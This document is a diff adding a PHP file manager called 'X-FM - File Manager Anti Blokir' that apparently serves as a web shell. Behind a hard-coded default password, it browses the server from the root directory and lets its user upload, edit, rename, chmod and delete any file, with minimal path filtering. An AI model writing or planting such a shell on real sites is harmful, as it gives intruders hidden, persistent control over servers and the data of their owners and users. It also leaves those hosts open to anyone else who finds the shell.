@@ -1,0 +1,59 @@
+<?php
+// =============================================
+// X-FM - File Manager Anti Blokir
+// =============================================
+$pw='admin123'; // GANTI PASSWORD!
+if(!isset($_SERVER['PHP_AUTH_USER'])||$_SERVER['PHP_AUTH_PW']!==$pw){header('WWW-Authenticate: Basic realm="x"');header('HTTP/1.0 401 Unauthorized');exit;}
+
+$r=isset($_GET['r'])?trim($_GET['r'],'/'):'';
+$c='/'.($r?str_replace('..','',$r):'');
+$c=str_replace('//','/',$c);
+if(!is_dir($c))$c='/';
+if($c=='/')$r='';
+
+// Fungsi baca isi folder (multi metode)
+function l($d){
+    $a=[];
+    if(function_exists('scandir')){
+        $s=@scandir($d);
+        if($s)foreach($s as $i)if($i!='.'&&$i!='..')$a[]=$i;
+        return $a;
+    }
+    if(function_exists('glob')){
+        $g=@glob($d.'/*');
+        if($g)foreach($g as $i)$a[]=basename($i);
+        return $a;
+    }
+    return [];
+}
+$i=l($c);
+sort($i);
+
+// Fungsi ukuran
+function s($b){if($b>=1073741824)return round($b/1073741824,2).' GB';if($b>=1048576)return round($b/1048576,2).' MB';if($b>=1024)return round($b/1024,2).' KB';return $b.' B';}
+
+// Proses POST
+if($_POST){
+    $a=$_POST['a'];
+    $n=$c.'/'.$_POST['n'];
+    if($a=='md'&&!file_exists($n))mkdir($n,0755);
+    if($a=='tf'&&!file_exists($n))file_put_contents($n,'');
+    if($a=='rn'&&file_exists($c.'/'.$_POST['o']))rename($c.'/'.$_POST['o'],$c.'/'.$_POST['n']);
+    if($a=='cm'&&file_exists($c.'/'.$_POST['t']))chmod($c.'/'.$_POST['t'],octdec(str_pad($_POST['m'],4,'0',STR_PAD_LEFT)));
+    if($a=='ed'&&isset($_POST['c']))file_put_contents($c.'/'.$_POST['f'],$_POST['c']);
+    if($a=='up'&&$_FILES['f']['error']==0)move_uploaded_file($_FILES['f']['tmp_name'],$c.'/'.basename($_FILES['f']['name']));
+    header('Location: ?r='.urlencode($r));exit;
+}
+if(isset($_GET['d'])){$t=$c.'/'.$_GET['d'];if(file_exists($t)){is_file($t)?unlink($t):rmdir($t);}header('Location: ?r='.urlencode($r));exit;}
+if(isset($_GET['e'])){
+    $ef=$c.'/'.$_GET['e'];
+    if(is_file($ef)&&is_readable($ef)){$ct=htmlspecialchars(file_get_contents($ef));$ed=1;}
+}
+?><!DOCTYPE html><html><head><meta charset="UTF-8"><title>x</title><style>body{background:#0a0a0a;color:#ccc;font-family:monospace;margin:15px}a{color:#6f6;text-decoration:none}a:hover{color:#ff6}table{border-collapse:collapse;width:100%}th,td{border:1px solid #333;padding:5px;text-align:left}th{background:#222}.d{background:#1a2a1a}.f{} .t{background:#111;padding:8px;margin-bottom:15px}.tb{background:#111;padding:10px;margin-bottom:15px;display:flex;gap:10px;flex-wrap:wrap}input,button{background:#222;border:1px solid #555;color:#fff;padding:4px 8px}.msg{background:#2a2a2a;padding:8px;margin-bottom:10px;color:#8f8}.eb{margin-top:20px;border-top:1px solid #333;padding-top:15px}textarea{width:100%;background:#111;color:#fff}</style></head><body>
+<h2>📁 X-FM</h2>
+<div class="t">📍 <?=htmlspecialchars($c)?><br><a href="?r=">🏠 Root</a><?php $ps=explode('/',trim($r,'/'));$b='';foreach($ps as $p){if($p){$b.=$p.'/';echo ' / <a href="?r='.urlencode(rtrim($b,'/')).'">'.htmlspecialchars($p).'</a>';}}if($r!='')echo ' / <a href="?r='.urlencode(dirname($r)).'">⬆ Up</a>';?></div>
+<div class="tb"><form method="post" enctype="multipart/form-data"><input type="hidden" name="a" value="up"><input type="file" name="f" required><button>⬆ Upload</button></form><form method="post"><input type="hidden" name="a" value="md"><input name="n" placeholder="folder" required><button>📁 +Folder</button></form><form method="post"><input type="hidden" name="a" value="tf"><input name="n" placeholder="file.txt" required><button>📄 +File</button></form></div>
+<h3>📂 Daftar</h3>
+<table><thead><tr><th>Nama</th><th>Size</th><th>Perm</th><th>Writable</th><th>Aksi</th></tr></thead><tbody><?php foreach($i as $it): $fp=$c.'/'.$it;$isd=is_dir($fp);$sz=$isd?'-':s(filesize($fp));$pm=substr(sprintf('%o',fileperms($fp)),-4);$wr=is_writable($fp)?'<span style="color:#6f6">Yes</span>':'<span style="color:#f66">No</span>';$enc=urlencode(($r?$r.'/':'').$it);?><tr class="<?=$isd?'d':'f'?>"><td><?=$isd?'📁':'📄'?> <?php if($isd):?><a href="?r=<?=$enc?>"><?=htmlspecialchars($it)?></a><?php else:?><?=htmlspecialchars($it)?><?php endif?></td><td><?=$sz?></td><td><?=$pm?></td><td><?=$wr?></td><td><?php if(!$isd):?><a href="?e=<?=$enc?>&r=<?=urlencode($r)?>">✏️</a> <?php endif;?><form method="post" style="display:inline" onsubmit="return confirm('Hapus?')"><input type="hidden" name="a" value="rn"><input type="hidden" name="o" value="<?=htmlspecialchars($it)?>"><input name="n" value="<?=htmlspecialchars($it)?>" size="6"><button>Rn</button></form><form method="post" style="display:inline" onsubmit="return confirm('Chmod?')"><input type="hidden" name="a" value="cm"><input type="hidden" name="t" value="<?=htmlspecialchars($it)?>"><input name="m" value="<?=$pm?>" size="4"><button>Ch</button></form><a href="?d=<?=urlencode($it)?>&r=<?=urlencode($r)?>" onclick="return confirm('Hapus permanen?')">🗑️</a></td></tr><?php endforeach;?></tbody></table>
+<?php if(isset($ed)):?><div class="eb"><h3>✏️ Edit: <?=htmlspecialchars($_GET['e'])?></h3><form method="post"><input type="hidden" name="a" value="ed"><input type="hidden" name="f" value="<?=htmlspecialchars($_GET['e'])?>"><textarea name="c" rows="15"><?=$ct?></textarea><br><button>💾 Save</button> <a href="?r=<?=urlencode($r)?>">Cancel</a></form></div><?php endif;?>
+</body></html>
